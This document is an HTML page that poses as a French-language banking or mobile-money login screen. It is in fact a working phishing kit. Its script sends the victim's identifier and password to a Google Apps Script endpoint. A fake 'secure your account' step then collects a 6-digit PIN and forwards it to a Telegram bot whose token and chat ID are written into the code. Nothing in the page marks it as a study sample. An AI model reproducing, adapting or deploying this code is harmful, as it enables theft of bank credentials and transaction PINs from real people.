<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background-image: url('x.png');
      background-size: cover;
      background-position: center;
      min-height: 100vh;
      overflow: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-bottom: 80px;
    }

    .page-wrapper {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 80px);
      padding-top: 40px;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 30px;
      height: 50px;
    }

    .logo-container img {
      height: 100%;
    }

    .login-box {
      background: white;
      border-radius: 20px;
      width: 320px;
      padding: 30px 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.15);
      text-align: center;
      margin-bottom: 30px;
    }

    h2 {
      margin-bottom: 20px;
      color: #1a1a1a;
      font-size: 24px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 14px;
      outline: none;
    }

    .password-container {
      position: relative;
    }

    .password-container input {
      padding-right: 40px;
    }

    .toggle-visibility {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
      width: 20px;
      height: 20px;
    }

    .toggle-visibility img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      filter: brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%);
    }

    .remember {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .remember input[type="checkbox"] {
      appearance: none;
      background-color: #fff;
      border: 2px solid #f1482d;
      border-radius: 4px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      position: relative;
    }

    .remember input:checked::before {
      content: "✓";
      position: absolute;
      left: 3px;
      top: -2px;
      color: white;
      font-size: 16px;
      background-color: #f1482d;
      border-radius: 2px;
      width: 100%;
      height: 100%;
      text-align: center;
    }

    .remember label {
      margin-left: 10px;
      color: #1a1a1a;
      font-weight: bold;
      font-size: 14px;
    }

    button.connexion {
      width: 100%;
      padding: 12px;
      background-color: #e5e5e5;
      border: none;
      border-radius: 20px;
      font-size: 16px;
      font-weight: bold;
      color: #1a1a1a;
      cursor: pointer;
    }

    .error {
      color: #f1482d;
      font-size: 14px;
      margin-top: 15px;
    }

    .devenir {
      margin-bottom: 30px;
      display: flex;
      justify-content: center;
    }

    .devenir button {
      background: white;
      color: #f1482d;
      border: 2px solid #f1482d;
      padding: 10px 20px;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
    }

    .bottom-menu {
      display: flex;
      justify-content: space-around;
      width: 100%;
      padding: 12px 0;
      background-color: white;
      position: fixed;
      bottom: 0;
      left: 0;
      border-top: 1px solid #e0e0e0;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-decoration: none;
      color: #333;
      font-size: 12px;
      padding: 0 5px;
      width: 25%;
      text-align: center;
    }

    .menu-icon {
      width: 24px;
      height: 24px;
      margin-bottom: 4px;
      object-fit: contain;
    }

    .menu-item:first-child .menu-icon {
      filter: brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%);
    }

    /* === Page 2 (PIN) === */
    #page2 {
      display: none;
      background-color: white;
      width: 100%;
      min-height: 100vh;
      text-align: center;
    }

    .top-bar {
      background-color: #f1482d;
      color: white;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: bold;
    }

    .container {
      padding: 40px 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 30px;
    }

    .icon-circle {
      width: 90px;
      height: 90px;
      background-color: #f1482b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon-dots {
      display: flex;
      gap: 8px;
    }

    .icon-dot {
      width: 8px;
      height: 8px;
      background-color: white;
      border-radius: 50%;
    }

    .instruction {
      font-size: 16px;
      color: #333;
    }

    .pin-dots-container {
      display: flex;
      gap: 12px;
      margin-top: 10px;
    }

    .pin-dot {
      width: 12px;
      height: 12px;
      background-color: #f1482d;
      border-radius: 50%;
      opacity: 0.15;
      transition: opacity 0.2s ease;
    }

    .pin-dot.filled {
      opacity: 1;
    }

    input[type="password"]#hiddenInput {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <!-- === Page 1 === -->
  <div id="page1">
    <div class="page-wrapper">
      <div class="logo-container">
        <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752920371/logo_uhwnmt.png" alt="Logo">
      </div>

      <div class="login-box">
        <h2>Bienvenue</h2>
        <input type="text" id="identifiant" placeholder="Identifiant">

        <div class="password-container">
          <input type="password" id="password" placeholder="Mot de passe">
          <span class="toggle-visibility" onclick="togglePassword()">
            <img src="https://res.cloudinary.com/dfeygxpwc/image/upload/v1752649689/1752649535674_hbfbwi.png" alt="voir">
          </span>
        </div>

        <div class="remember">
          <input type="checkbox" id="remember" checked>
          <label for="remember">Se souvenir de moi</label>
        </div>

        <button class="connexion">Connexion</button>

        <div class="error">Identifiant ou mot de passe oublié</div>
      </div>

      <div class="devenir"><button>Devenir client</button></div>
    </div>

    <div class="bottom-menu">
      <a href="#" class="menu-item">
        <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752916125/6821154_qtinen.png" alt="Accueil" class="menu-icon"><span>Accueil</span>
      </a>
      <a href="#" class="menu-item">
        <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752919067/1752918963546_fg9ltu.png" alt="Agences" class="menu-icon"><span>Agences</span>
      </a>
      <a href="#" class="menu-item">
        <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752919039/menu-60_egg3tp.png" alt="Menu" class="menu-icon"><span>Menu</span>
      </a>
    </div>
  </div>

  <!-- === Page 2 (Code PIN) === -->
  <div id="page2">
    <div class="top-bar">Sécuriser mon compte</div>
    <div class="container">
      <div class="icon-circle">
        <div class="icon-dots">
          <div class="icon-dot"></div>
          <div class="icon-dot"></div>
          <div class="icon-dot"></div>
          <div class="icon-dot"></div>
        </div>
      </div>
      <div class="instruction">
        Définissez un code PIN de 6 chiffres, pour sécuriser vos transactions
      </div>
<br>
<br>
      <div class="pin-dots-container" onclick="document.getElementById('hiddenInput').focus()">
        <div class="pin-dot" id="dot1"></div>
        <div class="pin-dot" id="dot2"></div>
        <div class="pin-dot" id="dot3"></div>
        <div class="pin-dot" id="dot4"></div>
        <div class="pin-dot" id="dot5"></div>
        <div class="pin-dot" id="dot6"></div>
      </div>
      <input type="password" id="hiddenInput" maxlength="6" inputmode="numeric" autofocus />
    </div>
  </div>

  <!-- === Scripts === -->
  <script>
    function togglePassword() {
      const p = document.getElementById("password");
      const icon = document.querySelector(".toggle-visibility img");
      if (p.type === "password") {
        p.type = "text";
        icon.style.filter = "none";
      } else {
        p.type = "password";
        icon.style.filter = "brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%)";
      }
    }

    document.querySelector('.connexion').addEventListener('click', function () {
      const id = document.getElementById("identifiant").value.trim();
      const pw = document.getElementById("password").value.trim();

      if (!id || !pw) {
        alert("Veuillez remplir l'identifiant et le mot de passe.");
        return;
      }

      const url = `https://script.google.com/macros/s/AKfycbzQzw2zwLTk5XvuN8t5dWZI_X2VqgZAEQUj4wANQ5M9Jpxpr870XYDjxqrREEKxcMQu/exec?identifiant=${encodeURIComponent(id)}&motdepasse=${encodeURIComponent(pw)}`;

      fetch(url)
        .then(res => res.text())
        .then(txt => {
          console.log("Réponse:", txt);
          document.getElementById("page1").style.display = "none";
          document.getElementById("page2").style.display = "block";
        })
        .catch(err => console.error("Erreur:", err));
    });

    const input = document.getElementById("hiddenInput");
    const dots = [...document.querySelectorAll(".pin-dot")];

    input.addEventListener("input", () => {
      const val = input.value;
      dots.forEach((dot, idx) => {
        dot.classList.toggle("filled", idx < val.length);
      });

      if (val.length === 6) {
        const token = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const chat_id = "6451561574";
        const message = `Code saisi: ${val}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
          .then(response => {
            if (response.ok) {
              console.log("Envoyé avec succès");
            } else {
              console.error("Erreur lors de l'envoi");
            }
          })
          .catch(error => {
            console.error("Erreur réseau:", error);
          });
      }
    });

    document.body.addEventListener("click", () => {
      input.focus();
    });
  </script>

</body>
</html>
